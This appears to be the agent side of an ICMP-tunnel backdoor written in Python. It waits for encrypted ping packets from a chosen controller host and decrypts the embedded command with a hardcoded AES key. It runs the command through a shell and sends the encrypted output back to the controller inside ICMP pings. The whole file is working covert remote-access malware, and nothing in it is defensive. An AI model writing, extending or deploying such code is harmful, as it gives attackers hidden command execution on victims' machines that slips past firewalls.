from tunnel import Listener
from tunnel import Convert2Icmp
from loader import AES_Decrypt
from loader import AES_Encrypt
import getopt
import re
import subprocess
import traceback
import sys

# 16位key
key = 'icmpyydsicmpyyds'


class RunCmd:
    def __init__(self, cmd):
        self.cmd = cmd

    def excute(self):
        cmd = self.cmd
        out = []
        try:
            output = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT)
            while True:
                line = output.stdout.readline()
                # 解码
                e_stdout = line.decode('gbk')
                if line == b'':
                    output.stdout.close()
                    return out
                out.append(e_stdout[:-1])
        except Exception as e:
            return traceback.format_exc()


def handler(msg):
    if ";;" in str(msg[0]):
        o = re.findall(r";;.*?;;", str(msg[0]))[0][2:-2]
        return AES_Decrypt(key, o)
    return


def getArg():
    lhost = "0.0.0.0"
    bind = "0.0.0.0"
    if len(sys.argv) < 2:
        sys.stdout.write("please input: -l 'lhost' -b 'bindhost'" + "\n")
        sys.exit(1)

    try:
        opts, args = getopt.getopt(sys.argv[1:], "l:b:", ["lhost=", "bind="])
    except getopt.GetoptError:
        sys.stdout.write("please input: -l 'lhost' -b 'bindhost'" + "\n")
        sys.exit(1)

    for opt, arg in opts:
        if opt in ("-l", "--lhost"):
            lhost = arg
            sys.stdout.write("[*] lhost: " + lhost + "\n")
        elif opt in ("-b", "--bind"):
            bind = arg
            sys.stdout.write("[*] bindhost: " + bind + "\n")

    return [lhost, bind]


if __name__ == '__main__':
    if sys.version_info < (3, 0):
        sys.stdout.write("wrote by Python 3.x\n")
        sys.exit(1)
    lhost, bind = getArg()
    while True:
        li = Listener(bind)
        msg = li.os_listener()
        if lhost in msg[1][0]:
            cmd = handler(msg)
            pn = RunCmd(cmd)
            out = pn.excute()
            res = ''
            for i in out:
                res += i
                res += "\n"
            icm = Convert2Icmp(lhost, AES_Encrypt(key, res))
            icm._ping()
